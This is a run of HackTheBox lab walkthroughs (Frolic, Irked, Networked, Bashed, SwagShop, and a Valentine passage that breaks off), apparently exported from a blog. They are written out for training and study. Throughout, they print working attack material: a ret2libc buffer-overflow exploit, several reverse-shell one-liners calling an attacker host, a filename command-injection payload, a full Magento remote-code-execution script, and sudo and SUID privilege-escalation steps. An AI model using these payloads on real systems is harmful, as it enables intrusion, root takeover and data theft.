sahay ayushSamba (port 139,445)Express/Node-RED (port 1880)nginx (port 9999)/test/backup/adminWhen we log in with these credentials, we are redirected to the following page:ook langageIt seems that it’s an esoteric langage like Ook!.Indeed:Let’s go to /asdiSIAJJ0QWE9JAS/asdiSIAJJ0QWE9JASIt really looks like a base64 encoded string. Let’s try to decode it:Now we have a zip file. I tried the password imnothuman found on http://10.10.10.111:9999/backup/password.txt but it didn’t work.zip2johnWhile waiting to find another password, I launched john. It turns out that the password was found almost instantly: In this case, the password found was password -_-brainduckSeems idkwhatispass is another password./dev/playsmsThe credentials are: username: admin password: idkwhatispassI didn’t get the version but there are multiple exploits out here:reverse shell (metasploit)Feeling lazy, so I decided to use metasploit:User (www-data)python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;);&quot; www-data@frolic:~/html/playsms$ cd /homecd /homewww-data@frolic:/home$ ls -lals -latotal 16drwxr-xr-x 4 root root 4096 Sep 23 2018 .drwxr-xr-x 22 root root 4096 Sep 23 2018 ..drwxr-xr-x 3 ayush ayush 4096 Sep 25 2018 ayushdrwxr-xr-x 7 sahay sahay 4096 Sep 25 2018 sahaywww-data@frolic:/home$ ayush’s flag:www-data@frolic:/home$ cd ayushcd ayushwww-data@frolic:/home/ayush$ ls -lals -latotal 36drwxr-xr-x 3 ayush ayush 4096 Sep 25 2018 .drwxr-xr-x 4 root root 4096 Sep 23 2018 ..-rw------- 1 ayush ayush 2781 Sep 25 2018 .bash_history-rw-r--r-- 1 ayush ayush 220 Sep 23 2018 .bash_logout-rw-r--r-- 1 ayush ayush 3771 Sep 23 2018 .bashrcdrwxrwxr-x 2 ayush ayush 4096 Sep 25 2018 .binary-rw-r--r-- 1 ayush ayush 655 Sep 23 2018 .profile-rw------- 1 ayush ayush 965 Sep 25 2018 .viminfo-rwxr-xr-x 1 ayush ayush 33 Sep 25 2018 user.txtwww-data@frolic:/home/ayush$ cat user.txtcat user.txt2ab95909cf509f85a6f476b59a0c2fe0www-data@frolic:/home/ayush$Let’s see wtha’s inside .binary directory:www-data@frolic:/home/ayush$ cd .binarycd .binarywww-data@frolic:/home/ayush/.binary$ ls -lals -latotal 16drwxrwxr-x 2 ayush ayush 4096 Sep 25 2018 .drwxr-xr-x 3 ayush ayush 4096 Sep 25 2018 ..-rwsr-xr-x 1 root root 7480 Sep 25 2018 ropwww-data@frolic:/home/ayush/.binary$A SUID binary! Seems that’s a way to privesc to root.Let’s have a local copy and disassemble it.A god way to do that is to base64 encode the binary’s content and then copied the output in the clipboard.$ base64 ArchitectureFirst thing first, what is the context ? What kind of architecture are we dealing with ?$ uname -aLinux frolic 4.4.0-116-generic 140-Ubuntu SMP Mon Feb 12 21:22:43 UTC 2018 i686 athlon i686 GNU/Linuxi686 okay so this is a 32 bits machine!I checked if the ASLR was enabled on the target:$ cat /proc/sys/kernel/randomize_va_space0Fine, it is not enabled.Using a decompilerI passed the binary to ghidra, and we see that strcpy is called with an unchecked parameter.We’re facing with a typical buffer overflow challenge.checksecThen, let’s run checksec within gdb-peda:`Calculating the offsetOur goal is to gain an access to root shell, so we have to find a way to call the system function with &quot;/bin/sh&quot; as an argument. Here are the steps:Libc address Get libc address (0xb7e19000) using ldd:$ ldd rop linux-gate.so.1 =&amp;gt; (0xb7fda000) libc.so.6 =&amp;gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e19000) /lib/ld-linux.so.2 (0xb7fdb000)system and exit addresses Locate the addresses of system (0x0003ada0) and exit (0x0002e9d0) functions:$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i system 245: 00112f20 68 FUNC GLOBAL DEFAULT 13 svcerr_systemerr@@GLIBC_2.0 627: 0003ada0 55 FUNC GLOBAL DEFAULT 13 __libc_system@@GLIBC_PRIVATE 1457: 0003ada0 55 FUNC WEAK DEFAULT 13 system@@GLIBC_2.0$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i exit 112: 0002edc0 39 FUNC GLOBAL DEFAULT 13 __cxa_at_quick_exit@@GLIBC_2.10 141: 0002e9d0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0 450: 0002edf0 197 FUNC GLOBAL DEFAULT 13 __cxa_thread_atexit_impl@@GLIBC_2.18 558: 000b07c8 24 FUNC GLOBAL DEFAULT 13 _exit@@GLIBC_2.0 616: 00115fa0 56 FUNC GLOBAL DEFAULT 13 svc_exit@@GLIBC_2.0 652: 0002eda0 31 FUNC GLOBAL DEFAULT 13 quick_exit@@GLIBC_2.10 876: 0002ebf0 85 FUNC GLOBAL DEFAULT 13 __cxa_atexit@@GLIBC_2.1.3 1046: 0011fb80 52 FUNC GLOBAL DEFAULT 13 atexit@GLIBC_2.0 1394: 001b2204 4 OBJECT GLOBAL DEFAULT 33 argp_err_exit_status@@GLIBC_2.1 1506: 000f3870 58 FUNC GLOBAL DEFAULT 13 pthread_exit@@GLIBC_2.0 1849: 000b07c8 24 FUNC WEAK DEFAULT 13 _Exit@@GLIBC_2.1.1 2108: 001b2154 4 OBJECT GLOBAL DEFAULT 33 obstack_exit_failure@@GLIBC_2.0 2263: 0002e9f0 78 FUNC WEAK DEFAULT 13 on_exit@@GLIBC_2.0 2406: 000f4c80 2 FUNC GLOBAL DEFAULT 13 __cyg_profile_func_exit@@GLIBC_2.2&quot;/bin/sh&quot; address Final thing, we need a strings that contains &quot;/bin/sh&quot; (0x15ba0b)$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep -i &quot;/bin/sh&quot; 15ba0b /bin/shPayloadexploit.py prepares our payload:#!/usr/bin/pythonimport struct# 1. Create bufferoffset = 52buffer = &#39;A&#39; * offset# 2. Little endian conversionlibc = 0xb7e19000system = struct.pack(&#39;&amp;lt;I&#39;, libc + 0x0003ada0)fn_exit = struct.pack(&#39;&amp;lt;I&#39;, libc + 0x0002e9d0)binsh = struct.pack(&#39;&amp;lt;I&#39;, libc + 0x15ba0b)payload = buffer + system + fn_exit + binshprint(payload)Download our script on the target machine:$ wget http://10.10.14.7:8000/exploit.pywget http://10.10.14.7:8000/exploit.py--2020-12-30 01:49:06-- http://10.10.14.7:8000/exploit.pyConnecting to 10.10.14.7:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 330 [text/x-python]Saving to: &#39;exploit.py&#39;exploit.py 100%[===================&amp;gt;] 330 --.-KB/s in 0s 2020-12-30 01:49:06 (28.6 MB/s) - &#39;exploit.py&#39; saved [330/330]RootExecute it, and then get root flag:www-data@frolic:/home/ayush/.binary$ ./rop $(python /tmp/exploit.py)./rop $(python /tmp/exploit.py)# ididuid=0(root) gid=33(www-data) groups=33(www-data)# cat /root/root.txtcat /root/root.txt85d3fdf03f969892538ba9a731826222# Useful links CVE-2017-9101 dCode - Ook! langage dCode - Brainfuck langage base64decode.org hackndo - ret2libc" }, { "title": "HackTheBox - Irked", "url": "/htb-irked/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, backdoor, UnrealIRCd, steganography, linpeas, SUID, decompilation, ghidra, writeup, oscp-prep", "date": "2020-12-29 20:15:34 +0700", "snippet": "Footholdnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Irked-full-port-scan.txt 10.10.10.117PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)| ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)| 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)| 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)|_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)80/tcp open http Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Site doesn&#39;t have a title (text/html).111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100024 1 33669/tcp6 status| 100024 1 43204/udp6 status| 100024 1 43678/tcp status|_ 100024 1 60648/udp status6697/tcp open irc UnrealIRCd8067/tcp open irc UnrealIRCd43678/tcp open status 1 (RPC #100024)65534/tcp open irc UnrealIRCdService Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelApache/2.4.10 (port 80)dirbNothing seems vulnerable on the Apache server. What about IRC ?UnrealIRCd (port 6697, 8067, 65534)According to the RFC 1459, in order to discuss with an IRC server we have to send 3 information: PASS, NICK and USER.Let’s send them to the target:Now we know UnrealIRCd’s version: 3.2.8.1.Manual exploitBy looking for exploits on this specific version, I came across this article describing a backdoor in UnrealIRCd:Indeed, if we use searchsploit to find IRC’s exploits the first one is about this backdoor:Let’s try to exploit this vuln manually. We have to send a payload containing AB + &amp;lt;command that we want to run&amp;gt;. ICMP test: Reverse shell: Note: we could have used metasploit, or nmap with the following options --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command=&quot;nc -e /bin/bash 10.10.14.6 4444&quot;User (ircd)ircd@irked:~/Unreal3.2$ cd /homeircd@irked:/home$ ls -latotal 16 drwxr-xr-x 4 root root 4096 May 14 2018 .drwxr-xr-x 21 root root 4096 May 15 2018 ..drwxr-xr-x 18 djmardov djmardov 4096 Nov 3 2018 djmardov drwxr-xr-x 3 ircd root 4096 May 15 2018 ircd ircd@irked:/home/$ cd djmardovircd@irked:/home/djmardov$ cd Documentsircd@irked:/home/djmardov/Documents$ ls -lals -latotal 16drwxr-xr-x 2 djmardov djmardov 4096 May 15 2018 .drwxr-xr-x 18 djmardov djmardov 4096 Nov 3 2018 ..-rw-r--r-- 1 djmardov djmardov 52 May 16 2018 .backup-rw------- 1 djmardov djmardov 33 May 15 2018 user.txtircd@irked:/home/djmardov/Documents$Okay so we have to privesc to djmardov’s account in order to read his user.txt. What’s inside .backup?ircd@irked:/home/djmardov/Documents$ cat .backupcat .backupSuper elite steg backup pwUPupDOWNdownLRlrBAbaSSssircd@irked:/home/djmardov/Documents$There is mention of steg which corresponds to steganography.The only file that I think contains a secret is this image on the web page. Let’s download it, and run steghide with the password UPupDOWNdownLRlrBAbaSSss found in .backup:Kab6h+m+bbp2J:HG is certainly the password of djmardov.User (djmardov)Indeed we can use this password to log in with SSH: Flag:djmardov@irked:~$ cd Documents/djmardov@irked:~/Documents$ cat user.txt 4a66a78b12dc0e661a59d3f5c0267a8eWe cannot run sudo:djmardov@irked:~$ sudo -l-bash: sudo: command not foundIf we take a closer look at the SUID files, we can see that exim4 and viewuser are the most recently updated ones.I copied viewuser to my machine (because I was more intrigued by this binary than exim4 which is a known Mail Transfer Agent) and I opened it with ghidra.Here is the disassembled main function: Note: we could also use ltrace.setuid(0) is set just before system(&quot;/tmp/listusers&quot;)So we just have to put a malicious content in /tmp/listusers and then execute viewuser.Rootdjmardov@irked:/tmp$ echo &quot;/bin/bash&quot; &amp;gt; /tmp/listusers; chmod +x /tmp/listusers; viewuserThis application is being devleoped to set and test user permissionsIt is still being actively developed(unknown) :0 2020-12-29 03:32 (:0)djmardov pts/0 2020-12-29 04:05 (10.10.14.7)root@irked:/tmp# iduid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)root@irked:/tmp# cat /root/root.txt8d8e9e8be64654b6dccc3bff4522daf3Useful links A backdoor in UnrealIRCd" }, { "title": "HackTheBox - Networked", "url": "/htb-networked/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, exiftool, file upload bypass, magic bytes, reverse-shell, cron, network-scripts, full disclosure, writeup, oscp-prep", "date": "2020-12-29 05:20:00 +0700", "snippet": "Footholdnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Networked-full-port-scan.txt 10.10.10.146Nmap scan report for 10.10.10.146Host is up (0.14s latency).Not shown: 65532 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: | 2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)| 256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)|_ 256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).443/tcp closed httpsApache/2.4.6 (port 80)dirb/backup$ tar xvf backup.tarindex.phplib.phpphotos.phpupload.phpSeems we have the source code of the website.Apparently we can upload pictures in /upload.php:and then view it in /photos.php:Moreover the file is stored following this pattern /uploads/&amp;lt;IP&amp;gt;.&amp;lt;extension&amp;gt;.At this point and after a quick look at the source code, I’m thinking: “it’s a file upload challenge” and we have to bypass the mimetype check.Thanks to exiftool, I was able to execute php code:reverse shellSteps to have a reverse shell: Download a malicious file that will allow us to execute code remotely: Test cmd parameter: Encode a bash reverse shell command with burp: Bash reverse shell command: bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.7/1234 0&amp;gt;&amp;amp;1&#39; URL: http://10.10.10.146/uploads/10_10_14_7.php.jpg?cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%37%2f%31%32%33%34%20%30%3e%26%31%27 User (apache)$ iduid=48(apache) gid=48(apache) groups=48(apache)$ cd /home$ lsguly$ cd guly$ ls -lals -latotal 28drwxr-xr-x. 2 guly guly 159 Jul 9 2019 .drwxr-xr-x. 3 root root 18 Jul 2 2019 ..lrwxrwxrwx. 1 root root 9 Jul 2 2019 .bash_history -&amp;gt; /dev/null-rw-r--r--. 1 guly guly 18 Oct 30 2018 .bash_logout-rw-r--r--. 1 guly guly 193 Oct 30 2018 .bash_profile-rw-r--r--. 1 guly guly 231 Oct 30 2018 .bashrc-rw------- 1 guly guly 639 Jul 9 2019 .viminfo-r--r--r--. 1 root root 782 Oct 30 2018 check_attack.php-rw-r--r-- 1 root root 44 Oct 30 2018 crontab.guly-r--------. 1 guly guly 33 Oct 30 2018 user.txtOk so we have to privesc in order to become guly.We have read privileges on both files crontab.guly and check_attack.php.$ cat crontab.gulycat crontab.guly*/3 * * * * php /home/guly/check_attack.php$ cat check_attack.phpSo every 3 minutes check_attack.php is executed:&amp;lt;?phprequire &#39;/var/www/html/lib.php&#39;;$path = &#39;/var/www/html/uploads/&#39;;$logpath = &#39;/tmp/attack.log&#39;;$to = &#39;guly&#39;;$msg= &#39;&#39;;$headers = &quot;X-Mailer: check_attack.php\\r\\n&quot;;$files = array();$files = preg_grep(&#39;/^([^.])/&#39;, scandir($path));foreach ($files as $key =&amp;gt; $value) { $msg=&#39;&#39;; if ($value == &#39;index.html&#39;) { continue; } #echo &quot;-------------\\n&quot;; #print &quot;check: $value\\n&quot;; list ($name,$ext) = getnameCheck($value); $check = check_ip($name,$value); if (!($check[0])) { echo &quot;attack!\\n&quot;; # todo: attach file file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX); exec(&quot;rm -f $logpath&quot;); exec(&quot;nohup /bin/rm -f $path$value &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&quot;); echo &quot;rm -f $path$value\\n&quot;; mail($to, $msg, $msg, $headers, &quot;-F$value&quot;); }}?&amp;gt;Interesting! We can abuse the following line:exec(&quot;nohup /bin/rm -f $path$value &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&quot;);$value has to be replaced by a malicious bash command beginning with ; so that we can another command.$ cd /var/www/html/uploads/$ touch &#39;; nc -c bash 10.10.14.7 4444&#39;User (guly) Flag:python -c &quot;import pty; pty.spawn(&#39;/bin/sh&#39;);&quot; sh-4.2$ cat user.txtcat user.txt526cfc2305f17faaacecf212c57d71c5Let’s run sudo -l with guly:$ sudo -lsudo -lMatching Defaults entries for guly on networked: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/binUser guly may run the following commands on networked: (root) NOPASSWD: /usr/local/sbin/changename.sh$ ls -la /usr/local/sbin/changename.sh-rwxr-xr-x 1 root root 422 Jul 8 2019 /usr/local/sbin/changename.shSince we only we only can read or execute changename.sh, we cannot replace changename.sh’s content by a malicious one.Let’s examine wath’s in changename.sh:#!/bin/bash -pcat &amp;gt; /etc/sysconfig/network-scripts/ifcfg-guly &amp;lt;&amp;lt; EoFDEVICE=guly0ONBOOT=noNM_CONTROLLED=noEoFregexp=&quot;^[a-zA-Z0-9_\\ /-]+$&quot;for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do echo &quot;interface $var:&quot; read x while [[ ! $x =~ $regexp ]]; do echo &quot;wrong input, try again&quot; echo &quot;interface $var:&quot; read x done echo $var=$x &amp;gt;&amp;gt; /etc/sysconfig/network-scripts/ifcfg-gulydone /sbin/ifup guly0 /etc/sysconfig/network-scripts/ifcfg-guly:$ cat /etc/sysconfig/network-scripts/ifcfg-gulyDEVICE=guly0ONBOOT=noNM_CONTROLLED=noNAME=ps /tmp/fooPROXY_METHOD=asodihBROWSER_ONLY=asdoihBOOTPROTO=asdoihThe thing is, as mentionned on this website: Redhat/CentOS root through network-scripts, incorrect whitespace filtering on the NAME attribute leads to code execution.Root$ sudo /usr/local/sbin/changename.shinterface NAME:random bashinterface PROXY_METHOD:randominterface BROWSER_ONLY:randominterface BOOTPROTO:random[root@networked network-scripts]# id iduid=0(root) gid=0(root) groups=0(root)[root@networked network-scripts]# cat /root/root.txtcat /root/root.txt0a8ecda83f1d81251099e8ac3d0dcb82[root@networked network-scripts]# Useful links Hacker’s Grimoire - File upload bypass Redhat/CentOS root through network-scripts" }, { "title": "HackTheBox - Bashed", "url": "/htb-bashed/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, phpbash, reverse-shell, sudo misconfiguration, writeup, oscp-prep", "date": "2020-12-27 05:59:00 +0700", "snippet": "Footholdnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -oN Bashed.txt 10.10.10.68Warning: 10.10.10.68 giving up on port because retransmission cap hit (1).Nmap scan report for 10.10.10.68Host is up (0.098s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.18 ((Ubuntu))Apache/2.4.18 (port 80)dirbphpbashAs mentionned on the post we saw earlier ↑, phpbash is running on /dev:reverse shell (www-data)export RHOST=&quot;10.10.14.7&quot;;export RPORT=1234;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;$ ls /homearrexel scriptmanagerWe can read user.txt by the way:$ cat /home/arrexel/user.txt2c281f318555dbc1b856957c7147bfc1Okay, so we identified two users: arrexel scriptmanagerHow about us?$ sudo -lMatching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALLThe sudo config tells us that we can switch to scriptmanager without password.User #1 (scriptmanager)$ sudo -i -u scriptmanagersudo -i -u scriptmanagerscriptmanager@bashed:~$ find / -user $(whoami) 2&amp;gt;/dev/null | grep -v &quot;^/proc&quot; /scripts/scripts/test.py/home/scriptmanager/home/scriptmanager/.profile/home/scriptmanager/.bashrc/home/scriptmanager/.nano/home/scriptmanager/.bash_history/home/scriptmanager/.bash_logout Let’s inspect this /scripts directory:scriptmanager@bashed:~$ cd /scriptscd /scriptsscriptmanager@bashed:/scripts$ ls -latotal 16drwxrwxr-- 2 scriptmanager scriptmanager 4096 Dec 4 2017 .drwxr-xr-x 23 root root 4096 Dec 4 2017 ..-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py-rw-r--r-- 1 root root 12 Dec 26 13:38 test.txtscriptmanager@bashed:/scripts$ cat test.txt; echo &quot;&quot;testing 123!scriptmanager@bashed:/scripts$ cat test.pyf = open(&quot;test.txt&quot;, &quot;w&quot;)f.write(&quot;testing 123!&quot;)f.closeThat’s suspicious buddy. root own the file test.txt.Moreover, the file is updated every minute (cronjob?). This implies that test.py is executed every minute also.More precisely by root because the script creates the file test.txt and it’s owned by him:RootLet’s copy root.txt in /tmp:$ echo &quot;import os; os.system(&#39;cp /root/root.txt /tmp/flag&#39;); os.system(&#39;chmod 444 /tmp/flag&#39;);&quot; &amp;gt; test.py scriptmanager@bashed:/scripts$ cat /tmp/flagcc4f0afe3a1026d402ba10329674a8e2" }, { "title": "HackTheBox - SwagShop", "url": "/htb-swagshop/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, Magento, e-commerce, SQLi, chaining exploits, fixing exploit, linpeas, sudo misconfiguration, vi, writeup, oscp-prep", "date": "2020-12-27 00:10:00 +0700", "snippet": "Footholdnmap scan (open ports)$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN SwagShop-full-port-scan.txt 10.10.10.140PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)| 256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)|_ 256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Home pageService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelApache 2.4.18 (port 80) | Magento (open source e-commerce)http://10.10.10.140/ seems to be an online shop with a Magento backend:2014 is the last time the website was edited?!By navigating through the website, there is something strange that we can notice, directories are prefixed with /index.php/. This is probably due to apache mod-rewrite misconfiguration:Thereby, I ran dirb:And we found an admin panel on http://10.10.10.140/index.php/admin:exploit creates admin accountDespite the fact that I don’t know the version yet, I’ve researched some exploits but either they are outdated (if we refer to the 2014 copyright), or they require authentication credentials, or they target specific magento plugins.Except for this one Magento eCommerce - Remote Code Execution. I just changed line 5 and 13 because of the /index.php prefix:An it worked:I logged in and I didn’t understand why I was redirected to this page first:Then I changed the URL to http://10.10.10.140/index.php/admin and I was redirected to the Magento’s admin dashboard:magescanAt this point, I looked for “magento scanners” and I found this one (magescan):If we take a look at this URL that the scanner found → http://10.10.10.140/app/etc/local.xml, we get mysql credentials in clear text:exploit remote code executionNow that we know the version, we can take a look at the exploit which requires authentication: Magento CE &amp;lt; 1.9.0.1 - (Authenticated) Remote Code Execution We fill these lines with the credentials created by the previous exploit, and the install date we saw on http://10.10.10.140/app/etc/local.xml:Then I encountered this error:I had to change line containing:request = br.open(url + &#39;block/tab_orders/period/7d/?isAjax=true&#39;, data=&#39;isAjax=false&amp;amp;form_key=&#39; + key)into:Exploit after updates:from hashlib import md5import sysimport reimport base64import mechanizedef usage(): print &quot;Usage: python %s &amp;lt;target&amp;gt; &amp;lt;argument&amp;gt;\\nExample: python %s http://localhost \\&quot;uname -a\\&quot;&quot; sys.exit()if len(sys.argv) != 3: usage()# Command-line argstarget = sys.argv[1]arg = sys.argv[2]# Config.username = &#39;forme&#39;password = &#39;forme&#39;php_function = &#39;system&#39; # Note: we can only pass 1 argument to the functioninstall_date = &#39;Wed, 08 May 2019 07:23:09 +0000&#39; # This needs to be the exact date from /app/etc/local.xml# POP chain to pivot into call_user_execpayload = &#39;O:8:\\&quot;Zend_Log\\&quot;:1:{s:11:\\&quot;\\00*\\00_writers\\&quot;;a:2:{i:0;O:20:\\&quot;Zend_Log_Writer_Mail\\&quot;:4:{s:16:&#39; \\ &#39;\\&quot;\\00*\\00_eventsToMail\\&quot;;a:3:{i:0;s:11:\\&quot;EXTERMINATE\\&quot;;i:1;s:12:\\&quot;EXTERMINATE!\\&quot;;i:2;s:15:\\&quot;&#39; \\ &#39;EXTERMINATE!!!!\\&quot;;}s:22:\\&quot;\\00*\\00_subjectPrependText\\&quot;;N;s:10:\\&quot;\\00*\\00_layout\\&quot;;O:23:\\&quot;&#39; \\ &#39;Zend_Config_Writer_Yaml\\&quot;:3:{s:15:\\&quot;\\00*\\00_yamlEncoder\\&quot;;s:%d:\\&quot;%s\\&quot;;s:17:\\&quot;\\00*\\00&#39; \\ &#39;_loadedSection\\&quot;;N;s:10:\\&quot;\\00*\\00_config\\&quot;;O:13:\\&quot;Varien_Object\\&quot;:1:{s:8:\\&quot;\\00*\\00_data\\&quot;&#39; \\ &#39;;s:%d:\\&quot;%s\\&quot;;}}s:8:\\&quot;\\00*\\00_mail\\&quot;;O:9:\\&quot;Zend_Mail\\&quot;:0:{}}i:1;i:2;}}&#39; % (len(php_function), php_function, len(arg), arg)# Setup the mechanize browser and optionsbr = mechanize.Browser()#br.set_proxies({&quot;http&quot;: &quot;localhost:8080&quot;})br.set_handle_robots(False)request = br.open(target)br.select_form(nr=0)br.form.fixup()br[&#39;login[username]&#39;] = usernamebr[&#39;login[password]&#39;] = passwordbr.method = &quot;POST&quot;request = br.submit()content = request.read()url = re.search(&quot;ajaxBlockUrl = \\&#39;(.*)\\&#39;&quot;, content)url = url.group(1)key = re.search(&quot;var FORM_KEY = &#39;(.*)&#39;&quot;, content)key = key.group(1)request = br.open(url + &#39;block/tab_orders/period/2y/?isAjax=true&#39;, data=&#39;isAjax=false&amp;amp;form_key=&#39; + key)tunnel = re.search(&quot;src=\\&quot;(.*)\\?ga=&quot;, request.read())tunnel = tunnel.group(1)payload = base64.b64encode(payload)gh = md5(payload + install_date).hexdigest()exploit = tunnel + &#39;?ga=&#39; + payload + &#39;&amp;amp;h=&#39; + ghtry: request = br.open(exploit)except (mechanize.HTTPError, mechanize.URLError) as e: print e.read()Finally the exploit worked:Reverse shell (www-data)$ python 37811.py http://10.10.10.140/index.php/admin/ &quot;bash -c &#39;bash -i &amp;gt;&amp;amp;/dev/tcp/10.10.14.7/4444 0&amp;gt;&amp;amp;1&#39;&quot;Now that we have an acces to the machine’s shell, let’s do enumeration with linpeas.sh:Thanks to this misconfiguration with the wildcard we can read both user and root flags, using vi as follows:User (haris)$ sudo /usr/bin/vi /var/www/html/../../../home/haris/user.txt flag: a448877277e82f05e5ddf9f90aefbac8Root$ sudo /usr/bin/vi /var/www/html/../../../root/root.txt flag: c2b087d66e14a652a3b86a130ac56721___Useful links CVE-2015-1397 Magento eCommerce - Remote Code Execution Magento CE &amp;lt; 1.9.0.1 - (Authenticated) Remote Code Execution " }, { "title": "HackTheBox - Valentine", "url": "/htb-valentine/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, nmap scan vuln, CVE-2014-0160, heartbleed, linpeas, tmux, writeup, oscp-prep", "date": "2020-12-26 02:45:00 +0700", "snippet": "Footholdnmap scan (open ports)$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Valentine-full-port-scan.txt 10.10.10.79Warning: 10.10.10.79 giving up on port because retransmission cap hit (1).Nmap scan report for 10.10.10.79Host is up (0.099s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)| 2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)|_ 256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)80/tcp open http Apache httpd 2.2.22 ((Ubuntu))|_http-server-header: Apache/2.2.22 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text/html).443/tcp open ssl/http Apache httpd 2.2.22 ((Ubuntu))|_http-server-header: Apache/2.2.22 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text/html).| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US| Not valid before: 2018-02-06T00:45:25|_Not valid after: 2019-02-06T00:45:25|_ssl-date: 2020-12-24T14:16:15+00:00; +3m43s from scanner time.Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelApache/2.2.22 (port 443)Thanks to the nmap scan we can identify a domain name: valentine.htb. Let’s add it to /etc/hosts.dirbThere is cgi-bin directory, is it to vulnerable to Shellshock ? Let’s look for .sh file:Nothing found. Let’s check the URLs that dirb has highlighted./dev directoryThere are two files in the /dev directory: notes.txt: hype_key:cyberchefVia CyberChef, we decoded hype_key:Since it’s an 